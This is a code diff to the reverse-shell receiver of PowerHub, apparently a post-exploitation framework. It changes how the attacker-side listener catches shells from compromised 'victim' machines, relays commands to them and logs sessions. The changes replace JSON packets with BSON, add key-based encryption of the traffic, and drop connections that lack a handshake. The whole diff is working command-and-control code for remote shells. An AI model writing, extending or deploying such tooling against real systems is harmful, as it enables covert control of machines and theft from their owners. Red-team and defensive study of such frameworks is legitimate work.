@@ -1,3 +1,4 @@
+import bson
 import json
 import os
 import select
@@ -6,12 +7,12 @@ import struct
 import threading
 from datetime import datetime as dt
 import email.utils as eut
-from powerhub.directories import XDG_DATA_HOME
 
-import logging
-log = logging.getLogger(__name__)
+from powerhub.directories import SHELL_LOG_DIR
+from powerhub.tools import encrypt, get_secret_key
+from powerhub.logging import log
 
-T_JSON = 0
+T_BSON = 0
 T_DICT = 1
 
 
@@ -20,30 +21,31 @@ class ReverseShell(threading.Thread):
     SHELL_HELLO = bytes([0x21, 0x9e, 0x10, 0x55, 0x75, 0x6a, 0x1a, 0x6b])
     signal_pipe = os.pipe()
 
-    def __init__(self, sock, key=None):
+    def __init__(self, sock):
         super(ReverseShell, self).__init__()
+        self.key = get_secret_key()
         self.details = {}
         self.rsock = sock  # the remote socket connected to the victim
         self.lsock = None  # the local socket for shell interaction
-        self.key = key
         self.log = []
-        self.get_shell_hello()
-        self.created = dt(*eut.parsedate(self.details["created"])[:6])
-        host, port = sock.getpeername()
-        self.details["peer_host"] = host
-        self.details["peer_port"] = port
-        self.description = ("[%(id)s] %(user)s@%(hostname)s "
-                            "(%(peer_host)s:%(peer_port)d)") % self.details
-        self.read_socks = [self.rsock, self.signal_pipe[0]]
-        self.write_socks = []
-        self.queue = {
-            self.rsock: []
-        }
-        self.active = True
-        log.info("%s - %s - Reverse Shell caught" % (
-                    host,
-                    self.details["id"],
-                    ))
+        self.active = False
+        if self.get_shell_hello():
+            self.created = dt(*eut.parsedate(self.details["created"])[:6])
+            host, port = sock.getpeername()
+            self.details["peer_host"] = host
+            self.details["peer_port"] = port
+            self.description = ("[%(id)s] %(user)s@%(hostname)s "
+                                "(%(peer_host)s:%(peer_port)d)") % self.details
+            self.read_socks = [self.rsock, self.signal_pipe[0]]
+            self.write_socks = []
+            self.queue = {
+                self.rsock: []
+            }
+            self.active = True
+            log.info("%s - %s - Reverse Shell caught" % (
+                        host,
+                        self.details["id"],
+                        ))
 
     def unset_lsock(self):
         if not self.lsock:
@@ -74,40 +76,48 @@ class ReverseShell(threading.Thread):
 
     def kill(self):
         log.info("%s - Killing shell" % (self.details["id"]))
-        p = ShellPacket(T_DICT, {"msg_type": "KILL", "data": ""})
+        p = ShellPacket({"msg_type": "KILL", "data": ""}, T_DICT)
         self.write_shell_packet(p, self.rsock)
 
     def get_shell_hello(self):
         r, _, _ = select.select([self.rsock], [], [])
         firstbytes = r[0].recv(8, socket.MSG_PEEK)
+        firstbytes = encrypt(firstbytes, self.key)
         if firstbytes == self.SHELL_HELLO:  # or rc4(shell_hello) TODO
+            log.debug("Shell hello received")
             r[0].recv(8)
             p = self.read_shell_packet(self.rsock)
             self.shell_type = 'smart'
             self.details.update(p["data"])
+            return p
         else:
-            self.shell_type = 'dumb'
-            for key in ["user", "host", "ps_version", "os_version",
-                        "arch", "domain"]:
-                self.details[key] = '?'
+            log.debug("No shell hello found")
+            return False
 
     def write_shell_packet(self, p, s):
         """Convert a ShellPacket to a byte string and send it across the
         wire"""
 
-        s.send(p.serialize())
+        data = p.serialize()
+        if s == self.rsock:
+            data = encrypt(data, self.key)
+        s.send(data)
         p.set_delivered()
 
     def read_shell_packet(self, s):
         """Deserialize byte string and instantiate ShellPacket"""
-        header = s.recv(6)
+        header = s.recv(4, socket.MSG_PEEK)
         if not header:
             return None
-        packet_type, packet_length = struct.unpack('>HI', header)
+        if s == self.rsock:
+            header = encrypt(header, self.key)
+        packet_length = struct.unpack('<i', header)[0]
         body = b''
         while len(body) < packet_length:
             body += s.recv(packet_length-len(body))
-        p = ShellPacket(packet_type, body)
+        if s == self.rsock:
+            body = encrypt(body, self.key)
+        p = ShellPacket(body)
         if p['msg_type'] == "PONG":
             log.debug("%s - Pong" % (self.details["id"]))
         elif p['msg_type'] == "KILL" and p['data'] == "confirm":
@@ -140,7 +150,7 @@ class ReverseShell(threading.Thread):
             timestamp = self.created
             timestamp = str(timestamp).replace(" ", "_")
             filename = "shell_%s_%s.txt" % (timestamp, self.details["id"])
-            filename = os.path.join(XDG_DATA_HOME, filename)
+            filename = os.path.join(SHELL_LOG_DIR, filename)
             with open(filename, 'a+') as f:
                 f.write(p.shell_string(colors=False))
                 if p["msg_type"] == "COMMAND":
@@ -182,7 +192,7 @@ class ReverseShell(threading.Thread):
         now = dt.now()
         if (now-self.t_sign_of_life).total_seconds() > 10:
             log.debug("%s - Ping" % (self.details["id"]))
-            p = ShellPacket(T_DICT, {"msg_type": "PING", "data": ""})
+            p = ShellPacket({"msg_type": "PING", "data": ""}, T_DICT)
             self.write_shell_packet(p, s)
 
     def run(self):
@@ -235,18 +245,20 @@ class ShellPacket(object):
         BOLD = '\033[1m'
         UNDERLINE = '\033[4m'
 
-    def __init__(self, packet_type, body):
-        if packet_type == T_JSON:
+    def __init__(self, body, packet_type=T_BSON):
+        if packet_type == T_BSON:
             try:
-                self.json = json.loads(body.decode())
+                self._dict = bson.loads(body)
             except Exception:
-                print(body.decode())
+                log.error("Could not decipher shell packet")
+                log.debug(body)
+                self._dict = {}
         elif packet_type == T_DICT:
-            self.json = body
+            self._dict = body
         else:
             raise Exception
-        if not self.json["data"]:
-            self.json["data"] = ""
+        if "data" not in self._dict:
+            self._dict["data"] = ""
         self.delivered = False
 
     def set_delivered(self):
@@ -254,18 +266,14 @@ class ShellPacket(object):
 
     def serialize(self):
         """Return a byte string of the ShellPacket"""
-
-        buffer = json.dumps(self.json).encode()
-        packet_length = len(buffer)
-        packet_type = T_JSON
-        header = struct.pack('>HI', packet_type, packet_length)
-        return (header + buffer)
+        buffer = bson.dumps(self._dict)
+        return buffer
 
     def __getitem__(self, key):
-        return self.json[key]
+        return self._dict[key]
 
     def __str__(self):
-        return json.dumps(self.json)
+        return json.dumps(self._dict)
 
     def shell_string(self, colors=True):
         if self["msg_type"] in ["OUTPUT", "COMMAND"]:
@@ -302,7 +310,7 @@ class ShellPacket(object):
             )
         elif self["msg_type"] == "SHELL_HELLO":
             result = ""
-            for key, val in self.json["data"].items():
+            for key, val in self["data"].items():
                 result += "%s:\t%s\n" % (key, val)
             return result
         else:
@@ -334,18 +342,20 @@ class ShellReceiver(object):
         while True:
             connection, addr = self.rsock.accept()
             rs = ReverseShell(connection)
-            stale_shells = [s for s in self.shells
-                            if s.details["id"] == rs.details["id"]]
-            for s in stale_shells:
-                s.unset_lsock()
-            self.shells.append(rs)
-            rs.start()
-            if self.push_notification:
-                self.push_notification(
-                    'info',
-                    'Reverse shell caught from %s:%d' % addr,
-                    'Receiver',
-                )
+            if rs.active:
+                stale_shells = [s for s in self.shells
+                                if s.details["id"] == rs.details["id"]]
+                for s in stale_shells:
+                    s.unset_lsock()
+                self.shells.append(rs)
+                rs.start()
+                if self.push_notification:
+                    self.push_notification(
+                        'info',
+                        'Reverse shell caught from %s:%d' % addr,
+                        'Receiver',
+                        shellid=rs.details["id"],
+                    )
 
     def run_provider(self, host='127.0.0.1', port=18157):
         """Provides a service where you can interact with caught shells"""
@@ -360,13 +370,16 @@ class ShellReceiver(object):
                 break
             peer_shell = [s for s in self.shells if s.details["id"] ==
                           id]
+            if id == "g"*8 and self.shells:
+                peer_shell = [self.shells[-1]]
             if not peer_shell:
                 log.error("No shell with ID %s found" % id)
                 connection.close()
+                continue
             peer_shell[0].set_lsock(connection)
             log.info("%s - %s - Connected local and reverse shell" % (
                         addr[0],
-                        id,
+                        peer_shell[0].details["id"],
                         ))
 
     def get_shell_by_id(self, shell_id):
